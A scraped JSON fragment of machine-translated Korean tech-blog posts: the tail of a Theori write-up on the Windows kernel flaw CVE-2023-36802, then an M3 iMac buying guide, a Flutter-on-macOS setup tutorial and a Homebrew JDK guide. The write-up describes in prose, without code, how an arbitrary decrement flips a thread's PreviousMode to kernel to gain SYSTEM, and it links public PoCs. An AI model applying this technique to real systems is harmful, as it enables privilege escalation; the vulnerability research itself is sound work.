처음 0x10바이트를 제외하고 완전히 제어 가능합니다 ([2]). 게다가, ThreadName 개체를 해제하는 코드도 있어서 홀을 만드는 데 유용합니다 ([8]).\n\n<img src=\"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_2.png\" />\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 객체를 사용하면 오프셋 0x188 및 0x1C8의 값을 완전히 처리하고 임의의 감소를 성공적으로 발생시킬 수 있습니다. 이 임의의 감소 기본 원리를 통해 현재 스레드 개체의 PreviousMode를 사용자(1)에서 커널(0)으로 변경할 수 있습니다. 여기서 커널 스레드 권한으로 권한 상승을 위한 잘 알려진 방법을 사용할 수 있습니다.\n\nFermium-252: 사이버 위협 인텔리전스 데이터베이스에는 PoC 및 익스플로잇 코드를 비롯한 자세한 정보가 있습니다. Fermium-252 서비스에 관심이 있다면 contacts@theori.io로 문의하십시오.\n\n# 결론\n\n이 게시물에서는 우리의 1일 완전한 체인 익스플로잇의 마지막 시리즈인 CVE-2023-36802의 분석을 제공했습니다. 이 블로그 시리즈가 끝나더라도 우리는 항상 세계의 위협을 분석하고 다른 흥미로운 연구 주제의 다른 블로그 게시물로 돌아올 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 참고 자료\n\n- [chompie1337의 GitHub 페이지](https://github.com/chompie1337/Windows_MSKSSRV_LPE_CVE-2023-36802)\n- [Nero22k의 GitHub 페이지](https://github.com/Nero22k/cve-2023-36802)\n- [보안 인텔리전스 기사](https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/)\n- [Microsoft 보안 업데이트 - CVE-2023-36802](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2023-36802)\n- [Google Project Zero의 보고서](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-36802.html)\n\n🔵 웹사이트: [theori.io](https://theori.io) ✉️ 이메일: vr@theori.io\n","ogImage":{"url":"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png"},"coverImage":"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png","tag":["Tech"],"readingTime":19},{"title":"드디어 새로운 iMac이 출시되었습니다 여러분의 iMac을 구매하는 방법을 안내해드립니다","description":"","date":"2024-05-23 15:19","slug":"2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours","content":"\n<img src=\"/assets/img/2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours_0.png\" />\n\n오랜만에 업데이트 없이 지내온 애플의 사랑받는 올인원 데스크탑 맥에 새로운 24인치 iMac이 드디어 출시되었습니다.\n\n\"새로운\"이라고 말씀을 드렸는데, 정확히 말하면 \"업그레이드\" 된 제품입니다.\n\n이는 2021년 5월에 출시된 24인치 iMac과 동일한 샤시, 디스플레이 및 포트 상황을 갖추고 있습니다. 다만 이제는 내부에 M3 칩이 들어가 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n애플의 이 새로운 칩은 3나노미터 공정을 기반으로 하여 원래 M1 칩보다 상당한 성능 향상을 제공합니다. 성능 코어는 최대 30% 빨라졌으며, 빠른 신경 엔진이 탑재되었고 GPU는 다른 차원입니다.\n\n하지만 24인치 iMac 중 어떤 버전이 당신에게 적합할까요? 기본 모델인 M3 iMac을 구매해야 할까요, 아니면 사양을 추가해야 할까요? 또한, 애플에 의해 후속 제품으로 대체되고 중단된 지금은 M1 iMac을 저렴한 가격에 구매하는 것이 좋을까요?\n\n이제 알아보겠습니다!\n\n## M1 또는 M3 24인치 iMac?\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\neBay를 짧게 뒤져 보니, £1,000/$1,000 미만에 괜찮은 사양의 중고 24인치 M1 iMac을 구할 수 있다는 것을 알았어요. 하지만 어느 정도 좋은 제품을 찾기 위해 노력해야 합니다.\n\n애플의 재생 제품 스토어를 이용하면 방문 시기에 따라 상당한 할인 혜택을 받을 수 있어요(저장 용량이 512GB인 기본 사양 M1 iMac의 할인액인 £390이 가장 좋은 예시로 보여졌어요).\n\n아마존은 현재 24인치 M1 iMac의 재고가 줄어들고 있는 상황에서 크게 할인해 주지는 않겠지만, M3 iMac이 시판되면 그 후 몇 주 동안 주목하는 것을 추천합니다.\n\n제 경험상, 거의 2년 반된 iMac을 새로운 M3 변형 버전보다 선택하는 것을 정당화할 만한 절약된 가격이 아직은 없어요. 절대적인 깨진 제품을 찾거나 새 iMac이 할 수 있는 범위를 넘어서는 것이 필요하지 않다면요. 일반 관리, 웹 사용, 글쓰기, 가끔 창작 프로젝트에 관여하는 등의 용도라면, M1 플랫폼은 여전히 탁월한 선택이에요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n정직하게 말하자면 - 당신은 M3 iMac에 흥미가 많아서 이것을 읽고 있는 거 아니에요?\n\n## M3 iMac: 어떤 칩 구성이 좋을까요?\n\n만약 24인치 iMac을 구매하려고 생각 중이라면, 운이 좋다고 생각하세요. 이 Mac을 위한 칩 구성은 M3 MacBook Pro나 M2 Mac mini에 비해 훨씬 쉽게 탐색할 수 있어요.\n\n기본 모델인 M3 iMac은 8코어 CPU와 8코어 GPU가 탑재돼 있어요. 이것은 £1,399/$1,299에 구매할 수 있으며, 집이나 사무실에서 유용하게 사용할 일반적인 업무용 iMac으로 충분한 성능을 제공할 거에요. 비디오 편집이나 그래픽 집중 작업에 자주 뛰어들 계획이 없다면 더 강력한 것은 필요하지 않아요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n원하는 경우 더 많은 금액을 지출하고 싶으시다면 다른 칩 구성이 하나 더 있습니다. 동일한 8코어 CPU를 갖고 있지만, 10코어 GPU로 인해 그래픽 성능이 향상됩니다. 이것은 추가로 £200/$200이 드는데, 이 구성을 위해 따로 업그레이드 받는 유일한 것은 GPU 코어 2개 뿐이라는 점을 중요하게 알아두시기 바랍니다. 이 구성은 동일한 8GB 통합 메모리와 256GB 저장 공간을 갖고 있습니다.\n\n내 의견으로는 이 추가된 GPU 코어 2개는 정말 선택해야 할 가치가 없고, 그래픽 집중적인 작업을 진정으로 많이 하지 않는 이상 그 존재를 느낄 수 있을지도 모릅니다.\n\n저는 24인치 M3 iMac에 할당된 추가 금액을 다른 곳에 쓰시는 것이 더 좋다고 생각합니다. 그러면 나머지 구성 옵션에 대해 이야기해 보겠습니다.\n\n## M3 iMac: 통합 메모리 얼마나 필요한가요?\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nM3 iMac은 통합 메모리에 대해 세 가지 옵션이 있습니다. 이는 이전의 M1 버전의 16GB 한계를 능가하는 중요한 업그레이드입니다. M3 iMac은 최대 24GB의 통합 메모리로 구성할 수 있습니다.\n\n베이스 모델의 8GB는 생각보다 훨씬 더 많은 것을 할 수 있습니다. 이 기기가 일반 가정 및 사무 업무에서 역할을 할 예정이라면 정말 더 이상 필요하지 않습니다.\n\n투자 가치를 극대화하고 장기적인 사용을 고려하는 사람을 위해, £200/$200을 지불하여 16GB의 통합 메모리를 얻는 것이 현명한 선택일 것입니다. 두 개의 GPU 코어에 동일한 가격을 쓰는 것보다 훨씬 현명한 선택일 것입니다.\n\n24GB에 대해 어떻게 생각하시나요? 만약 그만큼의 메모리가 필요하다는 것을 알고 계신다면, 그만큼의 메모리가 필요한 거죠. 대규모 데이터 집합을 작업하거나 많은 플러그인과 샘플 라이브러리를 사용하여 음악을 제작하는 사람들은 가능한 한 많은 메모리를 원할 것이며, £400/$400 업그레이드는 가치가 있을 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## M3 iMac: 저장 용량은 얼마인가요?\n\n아이맥은 내장 저장 공간에 너무 많은 돈을 쓸 필요가 거의 없는 맥북이에요. 특히 애플의 SSD 가격을 고려할 때 더욱 그렇습니다.\n\n예를 들어, M3 iMac의 256GB 기본 저장 용량을 512GB로 두 배로 늘리고 싶다면 추가로 $200/£200을 내야 합니다. 비교해보면, 1TB 저장 용량을 가진 삼성 T7 외장 SSD는 약 £80 정도에 구입할 수 있어요. 2TB를 원하시나요? 해당 삼성 T7 버전은 여전히 애플의 제공 제품보다 훨씬 싸구요 (게다가 아이맥은 내장 저장 용량이 1TB를 넘지 않아요).\n\nM3 iMac에 설치된 로컬 앱에 좀 더 여유 공간을 제공하기 위해 512GB 업그레이드를 하는 것은 합리적일 수 있지만, 추가 저장 용량이 필요하다면 언제나 타사 외장 SSD를 구매하는 것을 추천해요. 하더라도 그것들은 더 저렴하고, 크며, 무한히 확장 가능해요. 게다가 빛나는 새로운 iMac 뒤쪽에 깔끔하게 넣어두면 거기 없는 줄 알 거예요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## M3 iMac: 포트와 주변장치\n\n기본 모델 iMac은 두 개의 썬더볼트/USB 4 포트가 포함되어 있습니다. 그 이상을 얻는 유일한 방법은 다음 모델로 업그레이드하는 것인데, 해당 모델은 추가적으로 두 개의 USB 3 포트와 기가비트 이더넷이 전원 공급 장치에 내장되어 있습니다. 후자는 기본 모델에 추가 비용 £30/$30에 설치할 수 있습니다.\n\n주잡기로는 모든 모델에 매직 마우스와 매직 키보드가 포함되어 있습니다. 그러나, 기본 모델의 키보드에는 터치 ID가 포함되어 있지 않습니다. 터치 ID는 상위 구성 단계에서 표준으로 제공됩니다. 만약 기본 모델 M3 iMac에서 터치 ID를 원한다면 추가로 £50/$50을 지불해야 합니다.\n\n네덜란드 키보드는 iMac 선택에 따라 추가 비용이 £30/$30에서 £80/$80까지 발생할 수 있으며, 만약 마우스 대신 트랙패드를 좋아한다면 (강력히 추천드립니다), 해당 비용은 £50/$50이 소요됩니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n내 조언은요? Apple Watch가 있으면 Touch ID를 신경 쓰지 않아도 돼요 (맥을 잠금 해제하는 데 불필요하게 만들어요), 하지만 정말이지 Magic Mouse를 Magic Trackpad로 교체해보세요!\n\n## 결론: 어떤 M3 iMac이 당신에게 적합한가요?\n\n이 구매 가이드가 유용했다면 좋겠네요. 앞서 언급했듯이, 24인치 M3 iMac은 업그레이드 가능한 구성 요소와 구성이 상대적으로 적어 구매하기 쉬운 편이에요.\n\n요약하자면, 심하게 그래픽 집중적인 작업을 하지 않는 한, 기본 M3 칩을 그대로 두고 통합 메모리와 저장 공간 업그레이드에 예산을 집중하세요 (하지만 후자에 좀 지나치게 들어가지는 마세요!).\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n어떤 M1 iMac을 선택하셨나요? 어떤 용도로 사용할 건가요? 아래에서 의견을 공유해주세요!\n\n## 떠나시기 전에\n\n수익을 창출하고 행복한 온라인 크리에이터가 되는 팁을 얻으려면 제 Substack 뉴스레터에 가입해주세요! 이 게시물에는 제휴 링크가 포함되어 있습니다.\n\n원문은 2023년 11월 1일에 https://markellisreviews.com에서 게시되었습니다.\n","ogImage":{"url":"/assets/img/2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours_0.png"},"coverImage":"/assets/img/2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours_0.png","tag":["Tech"],"readingTime":7},{"title":"맥용 플러터 설정하기","description":"","date":"2024-05-23 15:18","slug":"2024-05-23-SettingupFlutterforMacOS","content":"\n이 튜토리얼은 MacOS 기기에 플러터를 설치하는 방법을 안내해드립니다. 맥에서 플러터를 사용하는 장점은 안드로이드 및 iOS 앱을 모두 개발할 수 있는 능력입니다.\n\n# 단계\n\n- 다음 명령을 사용하여 터미널을 통해 플러터를 설치합니다:\n\n```js\nbrew install --cask flutter\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n다트와 플러터를 \"/usr/local/bin\"에 설치할 것입니다.\n\n2. 설치를 확인하세요. 다음 명령을 사용하여 누락된 SDK 도구나 요구 사항이 있는지 확인할 수 있습니다.\n\n```js\nflutter doctor\n```\n\n만약 플러터, 다트 및 필요한 도구를 설치했다면 아래 표시된 이미지처럼 보일 것입니다. 초기에는 일부 도구가 누락될 수 있습니다. Step #3를 완료하면 확인 표시가 되어 있을 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![image](/assets/img/2024-05-23-SettingupFlutterforMacOS_0.png)\n\n3. Android 및 IOS 앱 개발에 필요한 도구 설치하기. 아래의 다음 섹션을 참조하세요.\n\n4. 선택한 IDE에 대한 확장 기능 설치하기.\n\n- Flutter 확장 기능이 포함된 Visual Studio Code 1.77 이상.\n- IntelliJ용 Flutter 플러그인이 포함된 Android Studio 2023.1(하지호그) 이상.\n- IntelliJ 및 Android 플러그인이 모두 포함된 IntelliJ IDEA 2023.1 이상.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 안드로이드 개발을 위해\n\n- 브라우저를 통해 Android Studio를 다운로드하여 설치하세요.\n\n- 해당 링크로 이동하세요: https://developer.android.com/studio\n\n2. 설치한 후에 Android Studio의 SDK 매니저로 이동하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n3. SDK Tools 탭 아래로 이동하여 SDK 명령줄 도구를 활성화하세요. 적용 버튼을 눌러주세요.\n\n![이미지](/assets/img/2024-05-23-SettingupFlutterforMacOS_1.png)\n\n4. 터미널로 돌아가서 라이센스를 수락하는 명령어를 실행하세요.\n\n```js\nflutter doctor --android-licenses\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n5. Flutter doctor를 다시 실행하여 설정이 제대로 되었는지 확인해보세요.\n\n6. Android Emulator를 설정하세요.\n\n   - Android Emulator는 이미 Android Studio에 포함되어 있습니다. 필요한 것은 여기에 나와 있는 단계를 따르는 것 뿐입니다: macOS에서 Flutter Android 앱 빌드 시작하기\n\n   - 참고: 링크의 1단계에서 VM 가속기는 더 이상 MacOS에서 지원되지 않음을 유념해주세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n안녕하세요! 안드로이드 에뮬레이터를 설정하면 구성에 따라 가상 안드로이드 장치가 표시됩니다. 이 에뮬레이터에서는 플러터 앱을 실행할 수 있어요.\n\n![이미지](/assets/img/2024-05-23-SettingupFlutterforMacOS_2.png)\n\n# iOS 개발을 위해\n\n개발 도구를 설치하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n- Xcode (버전 15 이상) — 네이티브 Swift 또는 ObjectiveC 코드를 디버그하고 컴파일합니다.\n\na. MacBook에서 앱 스토어를 열고 Xcode를 검색하세요.\n\nb. 그런 다음 \"get\"과 \"install\" 버튼을 클릭하세요. 이 작업을 계속하려면 Apple ID로 로그인해야 합니다. 설치에는 시간이 소요될 수 있습니다.\n\nc. 터미널에서 이 라인을 실행하세요. 이렇게 하면 명령줄 도구가 설치된 Xcode 버전을 사용하도록 구성됩니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nsudo sh -c 'xcode-select -s /Applications/Xcode.app/Contents/Developer && xcodebuild -runFirstLaunch'\n```\n\n터미널에서 “agree”를 입력하라는 안내가 표시됩니다.\n\nc. 터미널에서 다음 줄을 실행하세요. xcode 라이선스 동의서에 서명하십시오.\n\n```js\nsudo xcodebuild -license\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n터미널에서 \"동의\"를 입력하라는 프롬프트가 표시될 것입니다.\n\n2. 코코아팟 (1.13 또는 그 이상) - 네이티브 앱에서 플러터 플러그인을 컴파일하는 데 사용됩니다.\n\n- 설치하려면 터미널에서 다음 줄을 실행하세요.\n\n```js\nsudo gem install cocoapods\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n3. IOS 시뮬레이터 — 플러터 앱을 가상 IOS에서 표시합니다.\n\na. IOS 시뮬레이터 설치하기 — 시간이 걸릴 수 있습니다\n\n```js\nxcodebuild -downloadPlatform iOS\n```\n\nb. 시뮬레이터 실행하기\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nopen -a Simulator\n```\n\n심레이터를 실행하면 가상 아이폰이 표시되는 창 또는 팝업이 열립니다.\n\n<img src=\"/assets/img/2024-05-23-SettingupFlutterforMacOS_3.png\" />\n\n# 보너스:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n디버그하는 방법을 알려드릴게요!\n\n- VSCode에서는 flutter 애플리케이션을 디버그하기 위해 개발자 도구로 이동할 수 있습니다. cmd + Shift + P를 누르고 \"Flutter: Open DevTools\"를 입력하면 디버깅에 사용할 수 있는 개발 도구 목록이 표시됩니다:\n\n![이미지](/assets/img/2024-05-23-SettingupFlutterforMacOS_4.png)\n\n출처:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n- [https://docs.flutter.dev/get-started/install/macos](https://docs.flutter.dev/get-started/install/macos)\n","ogImage":{"url":"/assets/img/2024-05-23-SettingupFlutterforMacOS_0.png"},"coverImage":"/assets/img/2024-05-23-SettingupFlutterforMacOS_0.png","tag":["Tech"],"readingTime":7},{"title":"맥OS에서 여러 JDK를 설치하고 전환하는 방법","description":"","date":"2024-05-23 15:17","slug":"2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS","content":"\n![JDK installation on macOS](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_0.png)\n\n모든 운영 체제에는 macOS를 포함한 사전 설치된 JDK가 없습니다. 이 게시물에서는 macOS에 여러 JDK를 수동으로 설치하고 관리하는 방법을 살펴보겠습니다.\n\nmacOS에서 소프트웨어를 설치하는 잘 알려진 과정은 앱 아이콘을 클릭하거나 앱 아이콘을 Applications 폴더로 끌어다 놓는 것입니다. 이는 모든 설치 세부 정보를 멋진 앱 아이콘과 진행중인 바 아래에 숨깁니다.\n\n그러나 우리 개발자들은 로그를 보고 명령줄 도구를 사용하는 것을 좋아합니다. 이를 위해 Linux 배포판은 yum이나 apt-get과 같은 패키지 관리자를 사용합니다. 그러나 모든 것이 Apple로 이어지듯이 가장 일반적인 무료 소프트웨어는 macOS에서 작동하지 않습니다. 여기서 HomeBrew가 구원의 역할을 합니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# HomeBrew\n\n도구의 홈페이지에 따르면,\n\n```js\nmacOS를 위한 누락 된 패키지 관리자입니다.\nHomebrew는 macOS에 포함되지 않은 UNIX 도구를 설치하는 가장 쉽고 유연한 방법입니다.\n```\n\nHomebrew를 사용하면 명령 줄을 통해 소프트웨어를 설치 할 수 있으며 로그에서 많은 설치 정보를 볼 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# Homebrew 설치하기\n\n맥OS에 Homebrew를 설치하려면 맥OS의 Terminal 또는 iTerm 애플리케이션을 열고 아래 명령어를 실행하세요.\n\n```js\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n```\n\n이 작업이 완료되면 homebrew를 사용하여 사용 가능한 formulae 또는 cask를 한 줄로 설치할 수 있습니다. `brew install xxxx` 또는 `brew install --cask xxxx`와 같은 명령을 사용하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 다양한 JDK 버전 설치하기\n\n먼저, Homebrew를 사용하여 사용 가능한 Java 버전을 찾아보겠습니다. 다음 명령어를 사용해주세요.\n\n```bash\nbrew search --formulae java\n```\n\n아래에서 확인할 수 있듯이, java11과 java만 사용 가능합니다.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_1.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n더 오래된 버전을 원하시면, openjdk.java 및 java11을 openjdk 및 openjdk@11의 별명으로 사용하여 검색할 수 있습니다.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_2.png)\n\n이제 우리가 공식 이름을 알았으니, 하나의 명령어로 서로 다른 JDK를 설치할 수 있습니다. 최신 버전 및 java11을 설치해 보겠습니다.\n\n터미널 또는 iTerm에 다음 2개의 명령어를 차례대로 실행해 주세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nbrew install openjdk\nbrew install openjdk@11\n```\n\n# 일부 수동 설정\n\n이제 우리 Mac에는 자바 17과 자바 11이 모두 설치되어 있습니다.\nMac 프로그램에서 어떤 것을 사용할지 확인해 보겠습니다.\n\n- 어떤 기기에서든 현재 자바 버전을 확인하는 가장 쉬운 방법은\n  java -version을 사용하는 것입니다.\n- macOS에 설치된 모든 자바 버전을 확인할 수도 있습니다. java_home /usr/libexec/java_home -V를 사용하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n그러나 위 2개의 명령어를 시도하면 다음 출력이 나옵니다.\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_3.png\" />\n\n어떤 이유에서인지 macOS는 Homebrew로 설치한 Java를 감지하지 못합니다. 이것은 Homebrew를 사용하여 패키지를 설치할 때 매번 나타나는 문제입니다.\n\n- 패키지를 패키지 자체 디렉토리에 설치합니다.\n  M1-Mac의 경우 /opt/homebrew/Cellar에\n  Intel Mac의 경우 /usr/local/Cellar에\n- /opt/homebrew/opt 아래에 심볼릭 링크도 